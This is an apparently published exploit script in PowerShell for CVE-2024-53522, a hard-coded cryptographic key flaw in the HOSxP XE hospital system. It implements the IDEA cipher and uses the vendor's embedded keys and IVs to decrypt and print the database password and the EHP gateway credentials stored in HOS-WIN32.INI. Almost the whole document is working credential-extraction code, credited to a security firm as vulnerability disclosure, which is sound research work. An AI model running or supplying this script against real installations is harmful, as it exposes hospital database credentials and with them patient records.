# Exploit Title: Use of hard-coded cryptographic key in HOSxP XE
# Date: 28/12/2024
# Exploit Authors: Nut Pattarapongsin, Safecloud Co., Ltd.
# Vendor Homepage: (https://hosxp.net/)
# Version: 4.64.11.3
# CVE: CVE-2024-53522

function CVE-2024-53522 {
<#

.SYNOPSIS

Extract and decrypt data from HosXP config

.DESCRIPTION

Read data from HOS-WIN32.INI and decrypt encrypted data using IDEA Cipher CBC ported from DCPCrypt

.PARAMETER FilePath

Path to HOS-WIN32.INI config files, default is "C:\ProgramData\HOS-WIN32.INI" which is default config path used from HosXp

.EXAMPLE

CVE-2024-53522

Description
-----------
Extract and decrypt data from HOS-WIN32.INI file from "C:\ProgramData\HOS-WIN32.INI" (default path from HosXp installation)

.EXAMPLE

CVE-2024-53522 -F C:\Path\To\HOS-WIN32.INI

Description
-----------
Extract and decrypt data from user's provided path

.LINK

https://www.safecloud.co.th/researches/blog/CVE-2024-53522

#>

    [CmdletBinding()]
	param (

        [Parameter(Mandatory = $False)]
            [Alias("F")]
            [String] $FilePath = "C:\ProgramData\HOS-WIN32.INI"

    )

    PROCESS {

        class IDEA {
            [byte[]]$IV
            [byte[]]$CV
            [byte[]]$Key
            [int[]]$EK
            [int[]]$DK

            [void] SetKey([byte[]]$UserKey) {
                $this.Key = $UserKey
                $this.EK = @()
                $this.DK = @()
                [byte[]]$CurrentKey = $UserKey
                [String]$BinaryString = ""

                ### CREATE EK
                for (($i = 0); $i -lt 7; $i++) {
                    $this.EK += $this.ToWord($CurrentKey)
                    # Convert to long binary
                    for (($j = 0); $j -lt 16; $j++) {
                        $BinaryString += [convert]::ToString($CurrentKey[$j],2).Padleft(8,'0')
                    }
                    # Circular Shift left 25
                    for (($j = 0); $j -lt 25; $j++) {
                        $BinaryString = $BinaryString.Substring(1) + $BinaryString[0]
                    }
                    $CurrentKey = FromBinaryString($BinaryString)
                    $BinaryString = ""
                }
                $this.EK = $this.EK[0..51]
                ### END

                ### CREATE DK
                for (($i = 0); $i -lt 8; $i++) {
                    $multiplier = $i * 6
                    $lowerIndex = 46 - $multiplier

                    $this.DK += $this.mulInv($this.EK[$lowerIndex + 2], 65537)

                    $tmp1 = 4
                    $tmp2 = 3
                    if ($i -eq 0) {
                        $tmp1 = 3
                        $tmp2 = 4
                    }

                    $this.DK += $this.sumInv($this.EK[$lowerIndex + $tmp1], 65536)
                    $this.DK += $this.sumInv($this.EK[$lowerIndex + $tmp2], 65536)

                    $this.DK += $this.mulInv($this.EK[$lowerIndex + 5], 65537)
                    $this.DK += $this.EK[$lowerIndex]
                    $this.DK += $this.EK[$lowerIndex + 1]
                }
                $this.DK += $this.mulInv($this.EK[0], 65537)
                $this.DK += $this.sumInv($this.EK[1], 65536)
                $this.DK += $this.sumInv($this.EK[2], 65536)
                $this.DK += $this.mulInv($this.EK[3], 65537)
                ### END
            }

            [void] SetIV([byte[]]$val) {
                $this.IV = $val
                $this.CV = $this.IV
            }

            [void] Reset() {
                $this.CV = $this.IV
            }

            [int] modMul([int]$x, [int]$y) {
                return ($x * $y) % 65537
            }

            [int] modSum([int]$x, [int]$y) {
                return ($x + $y) % 65536
            }

            [int] mulInv([int]$a, [int]$m) {
                $m0 = $m
                $y = 0
                $x = 1 
                if ($m -eq 1) {
                    return 0
                }
                while ($a -gt 1) {

                    # q is quotient 
                    $q = [math]::floor($a / $m)
                    $t = $m

                    # m is remainder now, process 
                    # same as Euclid's algo 
                    $m = $a % $m 
                    $a = $t 
                    $t = $y 

                    # Update x and y 
                    $y = $x - $q * $y 
                    $x = $t 
                }
                
                # Make x positive 
                if ($x -lt 0) {
                    $x = $x + $m0 
                }
                return $x
            }

            [int] sumInv([int]$x, [int]$m) {
                return $m - $x
            }

            # Combine 2 bytes into one word
            [int[]] ToWord([byte[]]$ByteArray) {
                [int[]]$WordArray = @()
                [String]$Word = ""
                for (($i = 0); $i -lt $ByteArray.Length; $i += 2) {
                    $Word = [convert]::ToString($ByteArray[$i],2).Padleft(8,'0') + [convert]::ToString($ByteArray[$i+1],2).Padleft(8,'0')
                    $WordArray += [convert]::ToInt32($Word, 2)
                }
                return $WordArray
            }

            # Split Word to byte
            [byte[]] ToByte([int[]]$WordArray) {
                [byte[]]$ByteArray = @()
                for (($i = 0); $i -lt $WordArray.Length; $i++) {
                    $Word = [convert]::ToString($WordArray[$i],2).Padleft(16,'0')
                    $ByteArray += FromBinaryString($Word)
                }
                return $ByteArray
            }

            [byte[]] XorBlock([byte[]]$X, [byte[]]$Y, [int]$Size) {
                [byte[]]$Out = @()
                for (($i = 0); $i -lt $Size; $i++) {
                    $Out += $X[$i] -bxor $Y[$i]
                }
                return $Out
            }

            [byte[]] EncryptCBC([byte[]]$Plain) {
                $this.CV = $this.IV
                $Size = $Plain.Length
                [byte[]]$Cipher = @()

                [int]$i = 0
                if (($Size) -ge 8) {
                    for (; $i -lt ($Size - 8); $i += 8) {
                        $CurrentBlock = $Plain[$i..($i+7)]
                        $CipherBlock = $this.EncryptECB($this.XorBlock($CurrentBlock, $this.CV, 8))
                        $Cipher += $CipherBlock
                        $this.CV = $CipherBlock
                    }
                }
                if (($Size % 8) -ne 0) {
                    $this.CV = $this.EncryptECB($this.CV)
                    $Cipher += $this.XorBlock($Plain[$i..($i+7)], $this.CV, ($Size % 8))
                }
                return $Cipher 
            }

            [byte[]] DecryptCBC([byte[]]$Cipher) {
                $this.CV = $this.IV
                $Size = $Cipher.Length
                [byte[]]$Plain = @()

                [int]$i = 0
                if (($Size) -ge 8) {
                    for (; $i -lt ($Size - 8); $i += 8) {
                        $CurrentBlock = $Cipher[$i..($i+7)]
                        $Plain += $this.XorBlock($this.DecryptECB($CurrentBlock), $this.CV, 8)
                        $this.CV = $CurrentBlock
                    }
                }
                if (($Size % 8) -ne 0) {
                    $this.CV = $this.EncryptECB($this.CV)
                    $Plain += $this.XorBlock($Cipher[$i..($i+7)], $this.CV, ($Size % 8))
                }
                return $Plain 
            }

            [byte[]] EncryptECB([byte[]]$Plain) {
                # $Plain is 8 bytes long -> 4 words
                [int[]]$X = $this.ToWord($Plain)

                for (($i = 0); $i -lt 8; $i++) {
                    $multiplier = $i * 6

                    $one = $this.modMul($X[0], $this.EK[$multiplier + 0])
                    $two = $this.modSum($X[1], $this.EK[$multiplier + 1])
                    $three = $this.modSum($X[2], $this.EK[$multiplier + 2])
                    $four = $this.modMul($X[3], $this.EK[$multiplier + 3])

                    $five = $one -bxor $three
                    $six = $two -bxor $four
                    $seven = $this.modMul($five, $this.EK[$multiplier + 4])
                    $eight = $this.modSum($six, $seven)
                    $nine = $this.modMul($eight, $this.EK[$multiplier + 5])
                    $ten = $this.modSum($seven, $nine)

                    $eleven = $one -bxor $nine
                    $twelve = $three -bxor $nine
                    $thirteen = $two -bxor $ten
                    $fourteen = $four -bxor $ten

                    if ($i -eq 7) {
                        $X = $eleven, $thirteen, $twelve, $fourteen
                    } else {
                        $X = $eleven, $twelve, $thirteen, $fourteen
                    }
                }

                $X[0] = $this.modMul($X[0], $this.EK[48])
                $X[1] = $this.modSum($X[1], $this.EK[49])
                $X[2] = $this.modSum($X[2], $this.EK[50])
                $X[3] = $this.modMul($X[3], $this.EK[51])

                return $this.ToByte($X)
            }

            [byte[]] DecryptECB([byte[]]$Plain) {
                # $Plain is 8 bytes long -> 4 words
                [int[]]$X = $this.ToWord($Plain)

                for (($i = 0); $i -lt 8; $i++) {
                    $multiplier = $i * 6

                    $one = $this.modMul($X[0], $this.DK[$multiplier + 0])
                    $two = $this.modSum($X[1], $this.DK[$multiplier + 1])
                    $three = $this.modSum($X[2], $this.DK[$multiplier + 2])
                    $four = $this.modMul($X[3], $this.DK[$multiplier + 3])

                    $five = $one -bxor $three
                    $six = $two -bxor $four
                    $seven = $this.modMul($five, $this.DK[$multiplier + 4])
                    $eight = $this.modSum($six, $seven)
                    $nine = $this.modMul($eight, $this.DK[$multiplier + 5])
                    $ten = $this.modSum($seven, $nine)

                    $eleven = $one -bxor $nine
                    $twelve = $three -bxor $nine
                    $thirteen = $two -bxor $ten
                    $fourteen = $four -bxor $ten

                    if ($i -eq 7) {
                        $X = $eleven, $thirteen, $twelve, $fourteen
                    } else {
                        $X = $eleven, $twelve, $thirteen, $fourteen
                    }
                }

                $X[0] = $this.modMul($X[0], $this.DK[48])
                $X[1] = $this.modSum($X[1], $this.DK[49])
                $X[2] = $this.modSum($X[2], $this.DK[50])
                $X[3] = $this.modMul($X[3], $this.DK[51])

                return $this.ToByte($X)
            }
        }

        function FromHexString {

            param (
                [Parameter(Mandatory = $False)] [String] $hexString
            )

            [byte[]]@(for ($i = 0; $i -lt $hexString.Length; $i += 2) { [convert]::ToByte($hexString.Substring($i, 2), 16) })
        }

        function FromBinaryString {

            param (
                [Parameter(Mandatory = $False)] [String] $binString
            )

            [byte[]]@(for ($i = 0; $i -lt $binString.Length; $i += 8) { [convert]::ToByte($binString.Substring($i, 8), 2) })
        }

        function Parse-IniFile ($file) {
            $ini = @{}

            # Create a default section if none exist in the file. Like a java prop file.
            $section = "NO_SECTION"
            $ini[$section] = @{}

            switch -regex -file $file {
                "^\[(.+)\]$" {
                $section = $matches[1].Trim()
                $ini[$section] = @{}
                }
                "^\s*([^#].+?)\s*=\s*(.*)" {
                $name,$value = $matches[1..2]
                # skip comments that start with semicolon:
                if (!($name.StartsWith(";"))) {
                    $ini[$section][$name] = $value.Trim()
                }
                }
            }
            $ini
        }

        try {
            Write-Host "[+] Loading HOS-WIN32.INI File" -ForegroundColor Green
            $iniFile = Parse-IniFile $FilePath
            $password = $iniFile["SECURITY"]["PASSWORD"]
            Write-Host "[+] Successfully Loaded HOS-WIN32.INI File" -ForegroundColor Green
            Write-Host "[+] Decrypting Database's Password" -ForegroundColor Green
            $idea=[IDEA]::new()
            # get password part from cipher
            $cipher = FromHexString $password.Substring(64)
            $IV = FromHexString "B96E58BD22558581" 
            $idea.SetIV($IV)
            $key = FromHexString "2f5cf8b5e45ef8a912913597ae10887b"
            $idea.SetKey($key)
            "DB_NAME" + "=" + $iniFile["SECURITY"]["DB_NAME"]
            "USERNAME" + "=" + $iniFile["SECURITY"]["USERNAME"]
            "PASSWORD" + "=" + [System.Text.Encoding]::UTF8.GetString($idea.DecryptCBC($cipher))
            "DATABASE_TYPE" + "=" + $iniFile["SECURITY"]["DATABASE_TYPE"]
            "DB_SERVER" + "=" + $iniFile["SECURITY"]["DB_SERVER"]
            "DB_PORT" + "=" + $iniFile["SECURITY"]["DB_PORT"]
            "INSTANT_CLIENT" + "=" + $iniFile["SECURITY"]["INSTANT_CLIENT"]
            $IV = FromHexString "B34392257D1E7BBE"
            $idea.SetIV($IV)
            $key = FromHexString "E94596199382F62EFBA3CCD2946F5EF8"
            $idea.SetKey($key)
            $userCipher = FromHexString $iniFile["SECURITY"]["APPLICATION_USE_EHP_GATEWAY_USER"].Substring(64)
            $idea.Reset()
            $passCipher = FromHexString $iniFile["SECURITY"]["APPLICATION_USE_EHP_GATEWAY_PASSWORD"].Substring(64)
            $idea.Reset()
            $hospCipher = FromHexString $iniFile["SECURITY"]["APPLICATION_USE_EHP_GATEWAY_HOSPCODE"].Substring(64)
            "APPLICATION_USE_EHP_GATEWAY_URL" + "=" + $iniFile["SECURITY"]["APPLICATION_USE_EHP_GATEWAY_URL"]
            "APPLICATION_USE_EHP_GATEWAY_USER" + "=" + [System.Text.Encoding]::UTF8.GetString($idea.DecryptCBC($userCipher))
            "APPLICATION_USE_EHP_GATEWAY_PASSWORD" + "=" + [System.Text.Encoding]::UTF8.GetString($idea.DecryptCBC($passCipher))
            "APPLICATION_USE_EHP_GATEWAY_HOSPCODE" + "=" + [System.Text.Encoding]::UTF8.GetString($idea.DecryptCBC($hospCipher))
            Write-Host "[+] Successfully Extracted HosXP Database information" -ForegroundColor Green
        } catch [System.Management.Automation.ItemNotFoundException] {
            Write-Host "[-] Failed to load HOS-WIN32.INI or file doesn't exist" -ForegroundColor Red
        } catch {
            Write-Host "[-] ERROR" -ForegroundColor Red
            Write-Host $_ -ForegroundColor Red
        }
    }
}
